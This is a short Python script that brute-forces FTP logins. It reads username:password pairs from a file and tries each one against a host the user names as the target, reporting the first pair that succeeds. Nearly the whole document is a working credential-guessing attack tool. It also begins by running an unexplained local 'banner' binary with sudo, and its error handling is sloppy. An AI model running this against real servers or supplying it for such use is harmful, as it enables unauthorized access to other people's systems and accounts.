#!/usr/bin/python

import os
import subprocess
import ftplib

os.system(
     f" sudo chmod +x banner && sudo ./banner"
 )
def bruteLogin(hostname, passwordFile):
    try:
        file = open(passwordFile, 'r')
    except:
        print('[-] File Does Not Exist')
   
    print('[*] Attempting to Login to: ' + hostname + '\n') 
    for line in file.readlines():
        username = line.split(':')[0].strip('\n')
        password = line.split(':')[1].strip('\n')
        print('[*] Trying Credentials: ' + username + ' : ' + password)
        try:
            ftp = ftplib.FTP(hostname)
            login = ftp.login(username, password)
            print('[+] Login Successful With: ' + username + ' / ' + password)
            ftp.quit()
            return(username, password)
        except:
            pass
    print('[-] Password Not In List')

host = input("[*] Enter Host to Target: ")
passwordFile = input('[*] Enter User/Password File Path(type ftppass.txt for Deafault) : ')
bruteLogin(host, passwordFile)
